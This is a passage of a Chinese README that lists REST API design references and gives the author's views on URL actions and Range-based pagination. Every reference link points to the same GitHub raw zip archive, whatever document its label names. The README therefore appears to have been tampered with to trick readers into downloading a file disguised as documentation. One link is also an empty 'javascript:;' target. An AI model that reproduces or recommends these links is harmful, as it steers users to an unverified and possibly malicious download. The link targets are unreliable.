* [Standards.REST](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) 里面收集了不少对 REST API 设计有借鉴意义的标准和规范

## 其他接口设计指南

这里还有一些其他参考资料：

* [Microsoft REST API Guidelines](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，很多设计都很有意思，比如：
    * [7.10.2. Error condition responses](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [9.8. Pagination](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [10. Delta queries](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
    * [13. Long running operations](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [GitHub Developer - REST API v3](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [HTTP API Design Guide](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip) ，有以下两点我个人并不建议参考：
    * [Use consistent path formats](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
        还是不建议将动作写在 URL 中，像文档中的情况，可以将这个行为抽象成一个事务资源 `POST /runs/:run_id/stop-logs` 或者 `POST /runs/:run_id/stoppers` 来解决
    * [Paginate with Ranges](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
        确实是一个巧妙的设计，但似乎并不符合 `Content-Range` 的设计意图，而且有可能和需要使用到 `Content-Range` 的正常场景冲突（虽然几乎不可能），所以不推荐
* [Best Practices for Designing a Pragmatic RESTful API](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [Thoughts on RESTful API Design](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)
* [The RESTful CookBook](https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip)

[iso3166-1]: javascript:;
[iso3166-1_wiki]: https://github.com/KenTsuCo/http-api-guide/raw/refs/heads/master/carpingly/guide_api_http_1.1.zip
